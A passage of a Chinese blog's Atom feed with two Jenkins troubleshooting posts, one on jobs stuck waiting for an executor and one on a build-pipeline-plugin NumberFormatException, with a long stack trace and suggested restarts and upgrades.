    <content type="html"><![CDATA[<img src="/asserts/images/logo/jenkins.png" class="img-logo img-center" /><p>英文：pending-waiting for next available executor</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>查阅网上的资料，出现pending-waiting for next available executor的情况主要有二：</p><h3 id="磁盘存储空间已满"><a href="#磁盘存储空间已满" class="headerlink" title="磁盘存储空间已满"></a>磁盘存储空间已满</h3><ol><li>jenkins所在的服务器</li><li>任务运行涉及到的slave服务器</li></ol><h3 id="节点离线"><a href="#节点离线" class="headerlink" title="节点离线"></a>节点离线</h3><p>jenkins服务正常时，master节点有可能处于离线状态。此时，可以进入系统管理-&gt;管理节点，查看一下节点状态。<br><img src="http://7xkl4i.com1.z0.glb.clouddn.com/jenkins_node_status.png" alt="节点状态"></p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="jenkins所在服务器"><a href="#jenkins所在服务器" class="headerlink" title="jenkins所在服务器"></a>jenkins所在服务器</h3><p>重启jenkins服务后，可能需要过段时间节点才会正常加载并工作。</p><h3 id="任务运行涉及到的slave服务器"><a href="#任务运行涉及到的slave服务器" class="headerlink" title="任务运行涉及到的slave服务器"></a>任务运行涉及到的slave服务器</h3><p>重启过程导致slave服务器连接master失败，可以考虑重启一下jenkins slave服务。</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol><li><a href="http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor">http://stackoverflow.com/questions/15112890/jenkins-not-executing-jobs-pending-waiting-for-next-executor</a></li><li><a href="http://blog.csdn.net/jinhuiyu/article/details/4827051">http://blog.csdn.net/jinhuiyu/article/details/4827051</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/jenkins.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;英文：pending-waiting for next available executor&lt;/p&gt;
&lt;h2 id=&quot;问</summary>
      
    
    
    
    <category term="持续集成" scheme="http://yeshaoting.cn/categories/%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90/"/>
    
    
    <category term="jenkins" scheme="http://yeshaoting.cn/tags/jenkins/"/>
    
    <category term="issue" scheme="http://yeshaoting.cn/tags/issue/"/>
    
  </entry>
  
  <entry>
    <title>jenkins build-pipeline-plugin 数值解析异常</title>
    <link href="http://yeshaoting.cn/article/jenkins/jenkins%E6%8F%92%E4%BB%B6buildpipeline%E6%95%B0%E5%80%BC%E8%A7%A3%E6%9E%90%E5%BC%82%E5%B8%B8/"/>
    <id>http://yeshaoting.cn/article/jenkins/jenkins%E6%8F%92%E4%BB%B6buildpipeline%E6%95%B0%E5%80%BC%E8%A7%A3%E6%9E%90%E5%BC%82%E5%B8%B8/</id>
    <published>2015-12-29T05:58:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/jenkins.png" class="img-logo img-center" /><p>jenkins version: 1.574</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>这是jenkins 里使用了 build-pipeline-plugin，这个插件解析有问题。<br>目前，这个bug已经有人修复，处于resolved状态，等待异常报告者验收，修改代码目前是应该处于未发布状态。</p><p><strong>参考</strong>：<a href="https://issues.jenkins-ci.org/browse/JENKINS-24102">Jenkins gives strack trace on main page</a></p><span id="more"></span><h2 id="异常堆栈"><a href="#异常堆栈" class="headerlink" title="异常堆栈"></a>异常堆栈</h2><p>遇到的异常堆栈内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">A problem occurred <span class="keyword">while</span> processing the request. Please check our bug tracker to see <span class="keyword">if</span> a similar problem has already been reported. If it is already reported, please vote and put a comment on it to let us gauge the impact of the problem. If you think <span class="keyword">this</span> is a <span class="keyword">new</span> issue, please file a <span class="keyword">new</span> issue. When you file an issue, make sure to add the entire stack trace, along with the version of Jenkins and relevant plugins. The users list might be also useful in understanding what has happened.</span><br><span class="line"></span><br><span class="line">Stack trace</span><br><span class="line"></span><br><span class="line">javax.servlet.ServletException: org.apache.commons.jelly.JellyTagException: jar:file:/<span class="keyword">var</span>/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class="number">1.574</span>.jar!/hudson/model/View/index.jelly:<span class="number">42</span>:<span class="number">43</span>: &lt;st:include&gt; org.apache.commons.jelly.JellyTagException: jar:file:/<span class="keyword">var</span>/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class="number">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class="number">66</span>:<span class="number">22</span>: &lt;d:invokeBody&gt; <span class="keyword">null</span></span><br><span class="line">at org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:<span class="number">117</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.JellyFacet.handleIndexRequest(JellyFacet.java:<span class="number">127</span>)</span><br><span class="line">at org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:<span class="number">717</span>)</span><br><span class="line">at org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class="number">858</span>)</span><br><span class="line">at org.kohsuke.stapler.Stapler.tryInvoke(Stapler.java:<span class="number">795</span>)</span><br><span class="line">at org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class="number">858</span>)</span><br><span class="line">at org.kohsuke.stapler.Stapler.invoke(Stapler.java:<span class="number">631</span>)</span><br><span class="line">at org.kohsuke.stapler.Stapler.service(Stapler.java:<span class="number">225</span>)</span><br><span class="line">at javax.servlet.http.HttpServlet.service(HttpServlet.java:<span class="number">848</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHolder.handle(ServletHolder.java:<span class="number">686</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class="number">1494</span>)</span><br><span class="line">at hudson.util.PluginServletFilter$<span class="number">1.</span>doFilter(PluginServletFilter.java:<span class="number">96</span>)</span><br><span class="line">at hudson.util.PluginServletFilter.doFilter(PluginServletFilter.java:<span class="number">88</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class="number">1482</span>)</span><br><span class="line">at hudson.security.csrf.CrumbFilter.doFilter(CrumbFilter.java:<span class="number">48</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class="number">1482</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">84</span>)</span><br><span class="line">at hudson.security.UnwrapSecurityExceptionFilter.doFilter(UnwrapSecurityExceptionFilter.java:<span class="number">51</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">87</span>)</span><br><span class="line">at jenkins.security.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:<span class="number">117</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">87</span>)</span><br><span class="line">at org.acegisecurity.providers.anonymous.AnonymousProcessingFilter.doFilter(AnonymousProcessingFilter.java:<span class="number">125</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">87</span>)</span><br><span class="line">at org.acegisecurity.ui.rememberme.RememberMeProcessingFilter.doFilter(RememberMeProcessingFilter.java:<span class="number">142</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">87</span>)</span><br><span class="line">at org.acegisecurity.ui.AbstractProcessingFilter.doFilter(AbstractProcessingFilter.java:<span class="number">271</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">87</span>)</span><br><span class="line">at org.acegisecurity.ui.basicauth.BasicProcessingFilter.doFilter(BasicProcessingFilter.java:<span class="number">174</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">87</span>)</span><br><span class="line">at jenkins.security.ApiTokenFilter.doFilter(ApiTokenFilter.java:<span class="number">79</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">87</span>)</span><br><span class="line">at org.acegisecurity.context.HttpSessionContextIntegrationFilter.doFilter(HttpSessionContextIntegrationFilter.java:<span class="number">249</span>)</span><br><span class="line">at hudson.security.HttpSessionContextIntegrationFilter2.doFilter(HttpSessionContextIntegrationFilter2.java:<span class="number">67</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter$<span class="number">1.</span>doFilter(ChainedServletFilter.java:<span class="number">87</span>)</span><br><span class="line">at hudson.security.ChainedServletFilter.doFilter(ChainedServletFilter.java:<span class="number">76</span>)</span><br><span class="line">at hudson.security.HudsonFilter.doFilter(HudsonFilter.java:<span class="number">164</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class="number">1482</span>)</span><br><span class="line">at org.kohsuke.stapler.compression.CompressionFilter.doFilter(CompressionFilter.java:<span class="number">46</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class="number">1482</span>)</span><br><span class="line">at hudson.util.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:<span class="number">81</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:<span class="number">1474</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:<span class="number">499</span>)</span><br><span class="line">at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:<span class="number">137</span>)</span><br><span class="line">at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:<span class="number">533</span>)</span><br><span class="line">at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:<span class="number">231</span>)</span><br><span class="line">at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:<span class="number">1086</span>)</span><br><span class="line">at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:<span class="number">428</span>)</span><br><span class="line">at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:<span class="number">193</span>)</span><br><span class="line">at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:<span class="number">1020</span>)</span><br><span class="line">at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:<span class="number">135</span>)</span><br><span class="line">at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:<span class="number">116</span>)</span><br><span class="line">at org.eclipse.jetty.server.Server.handle(Server.java:<span class="number">370</span>)</span><br><span class="line">at org.eclipse.jetty.server.AbstractHttpConnection.handleRequest(AbstractHttpConnection.java:<span class="number">489</span>)</span><br><span class="line">at org.eclipse.jetty.server.AbstractHttpConnection.headerComplete(AbstractHttpConnection.java:<span class="number">949</span>)</span><br><span class="line">at org.eclipse.jetty.server.AbstractHttpConnection$RequestHandler.headerComplete(AbstractHttpConnection.java:<span class="number">1011</span>)</span><br><span class="line">at org.eclipse.jetty.http.HttpParser.parseNext(HttpParser.java:<span class="number">644</span>)</span><br><span class="line">at org.eclipse.jetty.http.HttpParser.parseAvailable(HttpParser.java:<span class="number">235</span>)</span><br><span class="line">at org.eclipse.jetty.server.AsyncHttpConnection.handle(AsyncHttpConnection.java:<span class="number">82</span>)</span><br><span class="line">at org.eclipse.jetty.io.nio.SelectChannelEndPoint.handle(SelectChannelEndPoint.java:<span class="number">668</span>)</span><br><span class="line">at org.eclipse.jetty.io.nio.SelectChannelEndPoint$<span class="number">1.</span>run(SelectChannelEndPoint.java:<span class="number">52</span>)</span><br><span class="line">at winstone.BoundedExecutorService$<span class="number">1.</span>run(BoundedExecutorService.java:<span class="number">77</span>)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:<span class="number">1156</span>)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:<span class="number">626</span>)</span><br><span class="line">at java.lang.Thread.run(Thread.java:<span class="number">804</span>)</span><br><span class="line">Caused by: org.apache.commons.jelly.JellyTagException: jar:file:/<span class="keyword">var</span>/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class="number">1.574</span>.jar!/hudson/model/View/index.jelly:<span class="number">42</span>:<span class="number">43</span>: &lt;st:include&gt; org.apache.commons.jelly.JellyTagException: jar:file:/<span class="keyword">var</span>/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class="number">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class="number">66</span>:<span class="number">22</span>: &lt;d:invokeBody&gt; <span class="keyword">null</span></span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:<span class="number">726</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class="number">281</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.CallTagLibScript$<span class="number">1.</span>run(CallTagLibScript.java:<span class="number">99</span>)</span><br><span class="line">at org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class="number">91</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class="number">269</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class="number">1.</span>run(CoreTagLibrary.java:<span class="number">98</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class="number">2.</span>run(CoreTagLibrary.java:<span class="number">105</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class="number">120</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.CallTagLibScript$<span class="number">1.</span>run(CallTagLibScript.java:<span class="number">99</span>)</span><br><span class="line">at org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class="number">91</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class="number">269</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class="number">1.</span>run(ReallyStaticTagLibrary.java:<span class="number">99</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class="number">1.</span>run(ReallyStaticTagLibrary.java:<span class="number">99</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class="number">1.</span>run(ReallyStaticTagLibrary.java:<span class="number">99</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class="number">1.</span>run(ReallyStaticTagLibrary.java:<span class="number">99</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class="number">1.</span>run(ReallyStaticTagLibrary.java:<span class="number">99</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class="number">1.</span>run(ReallyStaticTagLibrary.java:<span class="number">99</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class="number">2.</span>run(CoreTagLibrary.java:<span class="number">105</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class="number">120</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.CompressTag.doTag(CompressTag.java:<span class="number">44</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class="number">269</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.JellyViewScript.run(JellyViewScript.java:<span class="number">81</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:<span class="number">63</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.DefaultScriptInvoker.invokeScript(DefaultScriptInvoker.java:<span class="number">53</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.JellyClassTearOff.serveIndexJelly(JellyClassTearOff.java:<span class="number">112</span>)</span><br><span class="line">... <span class="number">63</span> more</span><br><span class="line">Caused by: java.lang.RuntimeException: org.apache.commons.jelly.JellyTagException: jar:file:/<span class="keyword">var</span>/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class="number">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class="number">66</span>:<span class="number">22</span>: &lt;d:invokeBody&gt; <span class="keyword">null</span></span><br><span class="line">at org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:<span class="number">280</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.groovy.Namespace$ProxyImpl.invoke(Namespace.java:<span class="number">92</span>)</span><br><span class="line">at com.sun.proxy.$Proxy56.projectView(Unknown Source)</span><br><span class="line">at lib.JenkinsTagLib$projectView.call(Unknown Source)</span><br><span class="line">at hudson.model.View.main.run(main.groovy:<span class="number">14</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:<span class="number">74</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.groovy.GroovierJellyScript.run(GroovierJellyScript.java:<span class="number">62</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.IncludeTag.doTag(IncludeTag.java:<span class="number">147</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class="number">269</span>)</span><br><span class="line">... <span class="number">95</span> more</span><br><span class="line">Caused by: org.apache.commons.jelly.JellyTagException: jar:file:/<span class="keyword">var</span>/cache/jenkins/war/WEB-INF/lib/jenkins-core-<span class="number">1.574</span>.jar!/lib/hudson/projectView.jelly:<span class="number">66</span>:<span class="number">22</span>: &lt;d:invokeBody&gt; <span class="keyword">null</span></span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.handleException(TagScript.java:<span class="number">726</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class="number">281</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class="number">1.</span>run(CoreTagLibrary.java:<span class="number">98</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.ReallyStaticTagLibrary$<span class="number">1.</span>run(ReallyStaticTagLibrary.java:<span class="number">99</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.ScriptBlock.run(ScriptBlock.java:<span class="number">95</span>)</span><br><span class="line">at org.apache.commons.jelly.tags.core.CoreTagLibrary$<span class="number">2.</span>run(CoreTagLibrary.java:<span class="number">105</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.CallTagLibScript.run(CallTagLibScript.java:<span class="number">120</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.groovy.JellyBuilder.doInvokeMethod(JellyBuilder.java:<span class="number">276</span>)</span><br><span class="line">... <span class="number">103</span> more</span><br><span class="line">Caused by: java.lang.NumberFormatException: <span class="keyword">null</span></span><br><span class="line">at java.lang.Integer.parseInt(Integer.java:<span class="number">465</span>)</span><br><span class="line">at java.lang.Integer.valueOf(Integer.java:<span class="number">593</span>)</span><br><span class="line">at au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getBuildPipelineForm(BuildPipelineView.java:<span class="number">400</span>)</span><br><span class="line">at au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.getItems(BuildPipelineView.java:<span class="number">866</span>)</span><br><span class="line">at au.com.centrumsystems.hudson.plugin.buildpipeline.BuildPipelineView.hasPermission(BuildPipelineView.java:<span class="number">932</span>)</span><br><span class="line">at hudson.model.ViewGroupMixIn.getViews(ViewGroupMixIn.java:<span class="number">115</span>)</span><br><span class="line">at jenkins.model.Jenkins.getViews(Jenkins.java:<span class="number">1444</span>)</span><br><span class="line">at sun.reflect.GeneratedMethodAccessor255.invoke(Unknown Source)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">55</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">618</span>)</span><br><span class="line">at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class="number">90</span>)</span><br><span class="line">at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class="number">233</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl$GetBeanMethodMetaProperty.getProperty(MetaClassImpl.java:<span class="number">3500</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.callsite.GetEffectivePojoPropertySite.getProperty(GetEffectivePojoPropertySite.java:<span class="number">61</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callGetProperty(AbstractCallSite.java:<span class="number">227</span>)</span><br><span class="line">at hudson.model.View.main$_run_closure1.doCall(main.groovy:<span class="number">15</span>)</span><br><span class="line">at sun.reflect.GeneratedMethodAccessor382.invoke(Unknown Source)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">55</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">618</span>)</span><br><span class="line">at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class="number">90</span>)</span><br><span class="line">at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class="number">233</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:<span class="number">272</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class="number">903</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.callsite.PogoMetaClassSite.callCurrent(PogoMetaClassSite.java:<span class="number">66</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.callsite.AbstractCallSite.callCurrent(AbstractCallSite.java:<span class="number">141</span>)</span><br><span class="line">at hudson.model.View.main$_run_closure1.doCall(main.groovy)</span><br><span class="line">at sun.reflect.GeneratedMethodAccessor381.invoke(Unknown Source)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:<span class="number">55</span>)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:<span class="number">618</span>)</span><br><span class="line">at org.codehaus.groovy.reflection.CachedMethod.invoke(CachedMethod.java:<span class="number">90</span>)</span><br><span class="line">at groovy.lang.MetaMethod.doMethodInvoke(MetaMethod.java:<span class="number">233</span>)</span><br><span class="line">at org.codehaus.groovy.runtime.metaclass.ClosureMetaClass.invokeMethod(ClosureMetaClass.java:<span class="number">272</span>)</span><br><span class="line">at groovy.lang.MetaClassImpl.invokeMethod(MetaClassImpl.java:<span class="number">903</span>)</span><br><span class="line">at groovy.lang.Closure.call(Closure.java:<span class="number">415</span>)</span><br><span class="line">at groovy.lang.Closure.call(Closure.java:<span class="number">409</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.groovy.JellyBuilder$<span class="number">1.</span>run(JellyBuilder.java:<span class="number">264</span>)</span><br><span class="line">at org.kohsuke.stapler.jelly.CallTagLibScript$<span class="number">1.</span>run(CallTagLibScript.java:<span class="number">99</span>)</span><br><span class="line">at org.apache.commons.jelly.tags.define.InvokeBodyTag.doTag(InvokeBodyTag.java:<span class="number">91</span>)</span><br><span class="line">at org.apache.commons.jelly.impl.TagScript.run(TagScript.java:<span class="number">269</span>)</span><br><span class="line">... <span class="number">111</span> more</span><br></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ol><li><p>重启jenkins服务(自己发现的)<br>服务出异常后，发现只要jenkins页面刷新后，jenkins cpu使用率会达到200％+，物理内存占用1.1g，虚拟内存占用2.7g。不知道跟这个异常有没关系。</p></li><li><p>尝试升级build-pipeline-plugin。</p></li><li><p>尝试升级jenkins版本。</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/jenkins.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;p&gt;jenkins version: 1.574&lt;/p&gt;
&lt;h2 id=&quot;问题分析&quot;&gt;&lt;a href=&quot;#问题分析&quot; class=&quot;headerlink&quot; title=&quot;问题分析&quot;&gt;&lt;/a&gt;问题分析&lt;/h2&gt;&lt;p&gt;这是jenkins 里使用了 build-pipeline-plugin，这个插件解析有问题。&lt;br&gt;目前，这个bug已经有人修复，处于resolved状态，等待异常报告者验收，修改代码目前是应该处于未发布状态。&lt;/p&gt;
